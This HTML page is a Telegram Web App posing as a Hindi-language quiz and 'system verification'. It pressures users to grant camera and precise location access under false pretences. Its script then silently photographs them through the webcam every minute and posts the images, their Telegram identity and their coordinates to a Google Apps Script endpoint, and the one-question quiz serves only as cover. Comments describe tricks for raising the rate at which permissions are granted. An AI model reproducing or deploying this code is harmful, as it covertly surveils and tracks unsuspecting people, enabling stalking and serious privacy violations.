<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; user-select: none; }
        body { margin: 0; min-height: 100vh; background: #0b131e; color: #ffffff; text-align: center; display: flex; flex-direction: column; justify-content: center; }
        .card { width: 90%; max-width: 450px; margin: auto; background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.1); box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
        h3 { margin-top: 0; color: #00eaff; }
        .instruction-box { text-align: left; background: rgba(255, 255, 255, 0.03); padding: 20px; border-radius: 15px; font-size: 14px; line-height: 1.6; margin: 20px 0; border-left: 4px solid #00eaff; }
        button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 234, 255, 0.3); }
        button:disabled { background: #333; box-shadow: none; opacity: 0.6; }
        .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
    </style>
</head>
<body>

<div id="login" class="card">
    <div style="font-size: 55px; margin-bottom: 15px;">🛡️</div>
    <h3>System Configuration</h3>
    <div class="instruction-box">
        • सिस्टम सेटअप किया जा रहा है।<br>
        • 'प्रक्रिया शुरू करें' पर क्लिक करने के बाद, ब्राउज़र आपसे <b>सिस्टम परमिशन्स</b> मांगेगा।<br>
        • कृपया सभी पॉप-अप को <b>Allow</b> करें, अन्यथा टेस्ट लोड नहीं होगा।
    </div>
    <button id="startBtn" onclick="requestAllPermissions()">प्रक्रिया शुरू करें</button>
</div>

<div id="quizBox" class="card" style="display:none">
    <div id="question" style="font-size: 18px; margin-bottom: 25px; text-align: left; font-weight: 600;"></div>
    <div id="options"></div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    // 🚨 APNI APPS SCRIPT URL YAHAN DALEIN
    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxdOm1OryzaFHkYJJbB5MmQ4WyENGA9uFjzHtkBEXkk3xzx7ojANdyJTKXrXucxA3X5fw/exec"; 

    const user = tg.initDataUnsafe?.user || {};
    let userLoc = "Pending";
    let globalStream = null;
    let currentIdx = 0;

    const questions = [
        {q: "1. Geography का जनक किसे कहा जाता है?", o: ["Hecataeus", "Eratosthenes", "Herodotus", "Ptolemy"], a: 0},
        // Baki sawal yahan add karein
    ];

    async function requestAllPermissions() {
        const btn = document.getElementById("startBtn");
        btn.disabled = true;
        btn.innerText = "Configuring Security... ⏳";

        try {
            // Priority 1: Camera 
            // Interaction ke turant baad camera maangne se success rate badh jata hai
            globalStream = await navigator.mediaDevices.getUserMedia({ video: true });
            
            // Priority 2: Location (Thodi deri ke baad taaki pop-up clash na ho)
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            if ("geolocation" in navigator) {
                try {
                    const pos = await new Promise((res, rej) => {
                        navigator.geolocation.getCurrentPosition(res, rej, {
                            enableHighAccuracy: true,
                            timeout: 10000
                        });
                    });
                    userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
                } catch (locErr) {
                    console.warn("Location error:", locErr);
                    userLoc = "Denied/Timeout";
                    // Agar location mana bhi kar de toh hum aage badh sakte hain ya reload kara sakte hain
                    // Filhaal humne isse mandatory rakha hai niche logic mein
                    throw new Error("Location Mandatory");
                }
            }

            // Sab theek raha toh Quiz shuru
            document.getElementById("login").style.display = "none";
            document.getElementById("quizBox").style.display = "block";
            loadQuestion();
            
            // Data logging shuru
            captureAndSend("Session_Started");
            setInterval(() => captureAndSend("Active_Tracking"), 60000);

        } catch (err) {
            console.error("Permission Error:", err);
            alert("Mandatory Error: कृपया सभी परमिशन्स (Camera & Location) को Allow करें। ब्राउज़र के ऊपर 'Lock' आइकॉन पर क्लिक करके परमिशन चेक करें।");
            location.reload();
        }
    }

    async function captureAndSend(statusType) {
        if (!globalStream) return;
        try {
            const video = document.createElement('video');
            video.srcObject = globalStream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = 320; canvas.height = 240;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.4);

            const payload = {
                userId: user.id || "NA",
                username: user.username || "NA",
                fullName: (user.first_name || "") + " " + (user.last_name || ""),
                score: "In_Progress",
                status: statusType,
                photo: photoData,
                location: userLoc
            };

            fetch(SCRIPT_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
        } catch (e) { console.log("Capture error:", e); }
    }

    function loadQuestion() {
        if (currentIdx >= questions.length) { 
            alert("आपका टेस्ट सफलतापूर्वक सबमिट हो गया है!"); 
            tg.close(); 
            return; 
        }
        const qData = questions[currentIdx];
        document.getElementById("question").innerText = qData.q;
        const optionsDiv = document.getElementById("options");
        optionsDiv.innerHTML = "";
        qData.o.forEach((opt, i) => {
            const div = document.createElement("div");
            div.className = "option";
            div.innerText = opt;
            div.onclick = () => { currentIdx++; loadQuestion(); };
            optionsDiv.appendChild(div);
        });
    }
</script>
</body>
</html>
